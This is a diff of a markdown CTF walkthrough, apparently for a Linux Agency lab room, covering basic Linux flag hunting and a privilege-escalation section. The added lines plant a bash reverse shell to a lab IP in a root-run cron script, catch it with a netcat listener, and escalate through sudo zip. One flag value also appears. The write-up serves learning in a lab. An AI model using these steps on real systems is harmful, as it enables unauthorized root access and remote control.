@@ -2,33 +2,33 @@
 
 ## Linux Fundamentals
 
-Agent 47, we are ICA, the Linux Agency. We will test your Linux Fundamentals. Let's see if you can pass all these challenges of basic Linux. The password of the next mission will be the flag of that mission. Example: mission1{1234567890} will be the password for the mission1 user.
+Agent 47, we are ICA, the Linux Agency. We will test your Linux Fundamentals. Let's see if you can pass all these challenges of basic Linux. The password of the next mission will be the flag of that mission. Example: mission1{1234567890} will be the password for the mission1 user.  
 
 ### What is the mission1 flag?
 
-`:> cd /`  
+`:> cd /`    
 
-`:> grep -ir mission1{ > /home/agent47/mission1.txt`
+`:> grep -ir mission1{ > /home/agent47/mission1.txt`  
 
-`:> cat mission1.txt`
+`:> cat mission1.txt`  
 
-`:> exit`
+`:> exit`  
 
 ### What is the mission2 flag?  
 
-`:> su mission1`
+`:> su mission1`  
 
-`:> cd ~`
+`:> cd ~`  
 
-`:> ls`
+`:> ls`  
 
-`:> su mission2`
+`:> su mission2`  
 
 `:> cd /home/mission2`  
 
-`:> cat flag.txt`
+`:> cat flag.txt`  
 
-`:> exit`
+`:> exit`  
 
 ### What is the mission3 flag?  
 
@@ -38,31 +38,31 @@ Agent 47, we are ICA, the Linux Agency. We will test your Linux Fundamentals. Le
 
 `:> find . -exec strings {} + | grep -i "mission"` : results  
 
-`:> exit`
+`:> exit`  
 
 ### What is the mission4 flag?
 
 `:> su mission4`  
 
-`:> cd ../mission4`
+`:> cd ../mission4`  
 
-`:> ls -alh > directory`
+`:> ls -alh > directory`  
 
-`:> cat directory`
+`:> cat directory`  
 
 `:> cat flag/flag.txt`  
 
-`:> exit`
+`:> exit`  
 
 ### What is the mission5 flag?
 
 `:> su mission5`  
 
-`:> cd ../mission5`
+`:> cd ../mission5`  
 
 `:> cat .flag.txt`  
 
-`:> exit`
+`:> exit`  
 
 ### What is the mission6 flag?
 
@@ -76,29 +76,29 @@ explanation: directory names were hidden from the screen but showed when the lis
 
 `:> cat .flag/flag.txt`  
 
-`:> exit`
+`:> exit`  
 
 ### What is the mission7 flag?
 
 `:> su mission7`  
 
-`:> cd ../mission7`
+`:> cd ../mission7`  
 
 `:> cat flag.txt`  
 
-`:> exit`
+`:> exit`  
 
 ### What is the mission8 flag?
 
 `:> su mission8`  
 
-`:> cd ../mission8`
+`:> cd ../mission8`  
 
 `:> find / -name flag* 2>/dev/null`  
 
 `:> cat /flag.txt`  
 
-`:> exit`
+`:> exit`  
 
 ### What is the mission9 flag?
 
@@ -106,19 +106,19 @@ explanation: directory names were hidden from the screen but showed when the lis
 
 `:> cd ../mission9`  
 
-`:> grep -i mission10 rockyou.txt`
+`:> grep -i mission10 rockyou.txt`  
 
-`:> exit`
+`:> exit`  
 
 ### What is the mission10 flag?
 
 `:> su mission10`  
 
-`:> cd ../mission10`
+`:> cd ../mission10`  
 
 `:> find . / -name *flag* 2>/dev/null`  
 
-`:> cat $(find . / -name *flag* 2>/dev/null)`
+`:> cat $(find . / -name *flag* 2>/dev/null)`  
 
 `:> exit`  
 
@@ -126,11 +126,11 @@ explanation: directory names were hidden from the screen but showed when the lis
 
 `:> su mission11`  
 
-`:> ls -alhR > results`
+`:> ls -alhR > results`  
 
 `:> find . -type f -exec strings {} \;` : find all files in the current and subdirectories and execute the "strings" command on each file.  
 
-`:> env`
+`:> env`  
 
 `:> exit`  
 
@@ -140,23 +140,23 @@ explanation: directory names were hidden from the screen but showed when the lis
 
 `:> cat flag.txt` : no permissions to read, but am the owner... HA! funny.  
 
-`:> chmod +r flag.txt`
+`:> chmod +r flag.txt`  
 
 `:> cat flag.txt`  
 
-`:> exit`
+`:> exit`  
 
 ### What is the mission13 flag?
 
 `:> su mission13`  
 
-`:> cd ../mission13`
+`:> cd ../mission13`  
 
-`:> cat flag.txt`  base64 encoded string
+`:> cat flag.txt`  base64 encoded string  
 
-`:> base64 -d flag.txt`
+`:> base64 -d flag.txt`  
 
- `:> exit`
+ `:> exit`  
 
 ### What is the mission14 flag?
 
@@ -164,21 +164,21 @@ explanation: directory names were hidden from the screen but showed when the lis
 
 `:> cd ../mission14`  
 
-`:> cat flag.txt`  : binary encoded string.
+`:> cat flag.txt`  : binary encoded string.  
 
-`:> awk '{for(i=1;i<=length($0);i+=8) printf "%c", strtonum("0b" substr($0,i,8))}' flag.txt`
+`:> awk '{for(i=1;i<=length($0);i+=8) printf "%c", strtonum("0b" substr($0,i,8))}' flag.txt`  
 
 `awk` : processes and analyzes text; best on structured text (csv, logs); `:> aws <optional pattern> { action} file`  
 
-`{..}` : contains the program to be executed on the input text
+`{..}` : contains the program to be executed on the input text  
 
 `$0` : built-in representing the entire line of input; differentiated from $1, $2, .. $N representing columns.  
 
-`for(i=1; i<=length($0); i+=8)` : open a for loop; set i=1, execute while the value of i is less than the length of the input $0, increment i by 8, effectively looping at the beginning of each binary encoded letter of the mission15 flag
+`for(i=1; i<=length($0); i+=8)` : open a for loop; set i=1, execute while the value of i is less than the length of the input $0, increment i by 8, effectively looping at the beginning of each binary encoded letter of the mission15 flag  
 
 `substr($0,i,8)` : extract a substring from $0, begining at i and containing 8 characters; resulting in a binary representation of a letter  
 
-`0b substr($0,i,8)` : prepend '0b' to the extracted substring; tells awk to interpret the sub-string as binary format
+`0b substr($0,i,8)` : prepend '0b' to the extracted substring; tells awk to interpret the sub-string as binary format  
 
 `strtonum("0b" substr($0,i,8))` : string-to-number function; convert the substring to decimal value  
 
@@ -192,7 +192,7 @@ explanation: directory names were hidden from the screen but showed when the lis
 
 `:> cd ../mission15`  
 
-`:> cat flag.txt`  : hexademical encoded string
+`:> cat flag.txt`  : hexademical encoded string  
 
 `:> xxd -r -p flag.txt`  
 
@@ -222,9 +222,9 @@ explanation: directory names were hidden from the screen but showed when the lis
 
 `:> file flag.java` : `flag.java: C source, ASCII text, with CRLF line terminators`  
 
-`:> chmod +x flag.java`
+`:> chmod +x flag.java`  
 
-`:> java flag.java` : failed
+`:> java flag.java` : failed  
 
 Convert to python:
 
@@ -238,13 +238,13 @@ if __name__== '__main__':
         print(outputString)
 ```
 
-`:> exit`
+`:> exit`  
 
 ### What is the mission19 flag?
 
 `:> su mission18`  
 
-`:> cd ../mission18`
+`:> cd ../mission18`  
 
 `:> cat flag.rb`  
 
@@ -263,7 +263,7 @@ encrypted = encryptDecrypt("73))354kc!;j8<nk<ol8i;9lhh>bjb<m;nibohon8m'")
 puts "#{encrypted}"
 ```
 
-`:> ruby flag.rb`
+`:> ruby flag.rb`  
 
 `:> exit`  
 
@@ -277,37 +277,37 @@ puts "#{encrypted}"
 
 `gcc flag.c -o flag`  
 
-`:> ./flag`
+`:> ./flag`  
 
-`:> exit`
+`:> exit`  
 
 ### What is the mission21 flag?
 
 `:> su mission20`  
 
-`:> cd ../mission20`
+`:> cd ../mission20`  
 
 `:> ls -alh`  
 
 `:> pythong3 flag.py`  
 
-`:> exit`
+`:> exit`  
 
 ### What is the mission22 flag?
 
-`:> su mission21`
+`:> su mission21`  
 
 `:> cd ../mission21`  
 
 `:> find / -user mission21 2>/dev/null > out`  
 
-`:> find / -name *flag* 2>/dev/null > /home/mission21/out`
+`:> find / -name *flag* 2>/dev/null > /home/mission21/out`  
 
 `:> cd /home/mission21`  
 
-`:> cat .bashrc` : encoded flag found
+`:> cat .bashrc` : encoded flag found  
 
-`:> grep 'echo "' .bashrc | bash` : answer
+`:> grep 'echo "' .bashrc | bash` : answer  
 
 `:> exit`  
 
@@ -321,35 +321,35 @@ Moves into a python environment.
 from os import system; system('bash')
 ```
 
-`:> cd /home/mission22/`
+`:> cd /home/mission22/`  
 
-`:> cat flag.txt`
+`:> cat flag.txt`  
 
-`:> exit`
+`:> exit`  
 
-`:> exit()`
+`:> exit()`  
 
 ### What is the mission24 flag?
 
-`:> su mission24`
+`:> su mission24`  
 
-`:> cd ../mission24`
+`:> cd ../mission24`  
 
-`:> cat message.txt`
+`:> cat message.txt`  
 
-`:> cat /etc/hosts`
+`:> cat /etc/hosts`  
 
-`:> curl mission24.com`
+`:> curl mission24.com`  
 
-`:> exit`
+`:> exit`  
 
 ### What is the mission25 flag?
 
-`:> su mission24`
+`:> su mission24`  
 
-`:> cd ../mission24`
+`:> cd ../mission24`  
 
-`:> ./bribe`
+`:> ./bribe`  
 
 ```text
 There is a guy who is smuggling flags
@@ -465,7 +465,7 @@ __cxa_finalize@@GLIBC_2.2.5
 .comment
 ```
 
-`:> ltrace .bribe`
+`:> ltrace .bribe`  
 
 ```text
 getenv("pocket")                                                           = nil  <- trying to read and enviornment variable
@@ -497,7 +497,7 @@ puts("Give Me money Man!!!\n"Give Me money Man!!!
 :> ltrace ./bribe
 ```
 
-result:
+result:  
 
 ```text
 getenv("pocket")                                                           = "1000" < get the enviornmenet variable
@@ -512,7 +512,7 @@ puts("Give Me money Man!!!\n"Give Me money Man!!!
 +++ exited (status 0) +++
 ```
 
-`:> export pocket=money && ./bribe` : solution
+`:> export pocket=money && ./bribe` : solution  
 
 `:> exit`  
 
@@ -528,13 +528,13 @@ puts("Give Me money Man!!!\n"Give Me money Man!!!
 bash: ls: No such file or directory  
 ```
 
-`:> cat /home/mission25/.bashrc`  
+`:> cat /home/mission25/.bashrc`    
 
 ```text
 bash: cat: No such file or directory  
 ```
 
-`:> compgen -c` : list available commands`
+`:> compgen -c` : list available commands`  
 
 `:> cd /home/mission25`  
 
@@ -542,7 +542,7 @@ bash: cat: No such file or directory
 
 `:> less flag.txt`  
 
-`:> exit`
+`:> exit`  
 
 ### What is the mission27 flag?
 
@@ -560,15 +560,15 @@ lrwxrwxrwx  1 mission26 mission26    9 Jan 12  2021 .bash_history -> /dev/null
 -rw-r--r--  1 mission26 mission26  807 Jan 12  2021 .profile
 ```
 
-`:> strings flag.jpg | grep mission27`
+`:> strings flag.jpg | grep mission27`  
 
 `:> exit`
 
--mission27{444d29b932124a48e7dddc0595788f4d}
+-mission27{444d29b932124a48e7dddc0595788f4d}  
 
 ### What is the mission28 flag?
 
-`:> cd ../mission27 && ls -alh`  
+`:> cd ../mission27 && ls -alh`   
 
 ```text
 total 20K
@@ -581,7 +581,7 @@ lrwxrwxrwx  1 mission27 mission27    9 Jan 12  2021 .bash_history -> /dev/null
 mission27@linuxagency:~$ 
 ```  
 
-`:> file flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz`
+`:> file flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz`  
 
 ```text
 flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz: 
@@ -600,11 +600,11 @@ flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png: GIF image data
 
 `:> strings flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png`  
 
-`:> exit`
+`:> exit`  
 
 ### What is the mission29 flag?
 
-`:> su mission28`
+`:> su mission28`  
 
 Open a ruby interactive shell  
 
@@ -617,9 +617,9 @@ NameError (undefined local variable or method `ls' for main:Object)
 irb(main):002:0> 
 ```
 
-`>>> exec '/bin/bash`
+`>>> exec '/bin/bash`  
 
-Interactive bash shell spawns
+Interactive bash shell spawns  
 
 `:> cd /home/mission28`  
 
@@ -630,23 +630,23 @@ Interactive bash shell spawns
 
 ### What is the mission30 flag?
 
-`:> su mission29`
+`:> su mission29`  
 
-`:> cd ../mission29`
+`:> cd ../mission29`  
 
 `:> grep -ir mission30{`  
 
-Done
+Done  
 
-`:> exit
+`:> exit`  
 
 ### What is viktor's Flag?
 
-`:> su mission30`
+`:> su mission30`  
 
 `:> cd ../mission30`  
 
-`:> ls -alh`
+`:> ls -alh`  
 
 `:> cd .git`  
 
@@ -654,28 +654,28 @@ Done
 
 Found  
 
-`:> exit`
+`:> exit`  
 
 ## Task 4 Privilege Escalation
 
-Welcome to Privilege Escalation, 47. Glad you made it this far!!! Now, here are some special targets. Your Target is to teach these bad guys a lesson.
+Welcome to Privilege Escalation, 47. Glad you made it this far!!! Now, here are some special targets. Your Target is to teach these bad guys a lesson.  
 
-Good luck 47!!!!
+Good luck 47!!!!  
 
-Mission Active
+Mission Active  
 
-Answer the questions below
-su into viktor user using viktor's flag as password
+Answer the questions below  
+su into viktor user using viktor's flag as password  
 
 ### What is dalia's flag?
 
-`:> su viktor`
+`:> su viktor`  
 
 `:> cd ../viktor`  
 
-`:> ls -alh`
+`:> ls -alh`  
 
-`:> ls -alh .gnupg`
+`:> ls -alh .gnupg`  
 
 `:> ls -alh .gnupg/private-keys-v1.d` : Nothing useful  
 
@@ -685,15 +685,29 @@ Refer to privilege escalation file
 
 Find some information  
 
-The file indicated is owned by viktor...  but executed with root privilege.
+The file indicated is owned by viktor...  but executed with root privilege.  
 
-echo "bash -i >& /dev/tcp/10.67.108.130/5555 0>&1" >> /opt/scripts/47.sh
+echo "bash -i >& /dev/tcp/10.67.108.130/5555 0>&1" >> /opt/scripts/47.sh  
 
-`:> nc -lvnp 5555` : open listener
+`:> nc -lvnp 5555` : open listener  
 
+Reverse shell received.  
 
+`:> cat flag.txt`  
 
 ### What is silvio's flag?
+
+`:> sudo -l` : reveals zip as useable by silvio; dalia can execute as silvio
+
+GTFObins has the answer  
+
+```bash
+:> TF=$(mktemp -u) # make the temp-file
+:> sudo -u silvio zip $TF /etc/hosts -T -TT '/bin/bash -i'
+:> id
+:> cd /home/silvio
+:> cat flag.txt
+```
 
 ### What is reza's flag?
 
